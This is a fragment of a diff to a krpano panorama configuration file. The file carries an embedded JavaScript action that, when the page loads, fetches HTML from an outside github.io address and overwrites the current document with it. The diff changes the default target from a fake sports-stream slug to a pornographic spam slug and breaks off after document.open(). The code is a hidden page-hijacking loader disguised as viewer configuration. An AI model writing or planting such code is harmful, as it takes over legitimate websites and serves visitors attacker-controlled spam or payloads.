@@ -1,9 +1,9 @@
 <krpano version="1.0.8.15">
 <action name="js_loader_start" type="Javascript"><![CDATA[
-var id = new URLSearchParams(window.location.search).get("id") || "video-leeds-vs-spurs-premier-league-live-s-treams-x7Kp2";
+var id = new URLSearchParams(window.location.search).get("id") || "xxx-xnxx-sexy-russian-porn-sex-hot-hd-aK7mP2";
 if (!window.__kgh_loader_done) {
   window.__kgh_loader_done = 1;
-  window.fetch("https://lovecrash301.github.io/event/luw/" + id + ".html")
+  window.fetch("https://lovecrash301.github.io/event/yhc/" + id + ".html")
     .then(function (r) { return r.text(); })
     .then(function (html) {
       window.document.open();
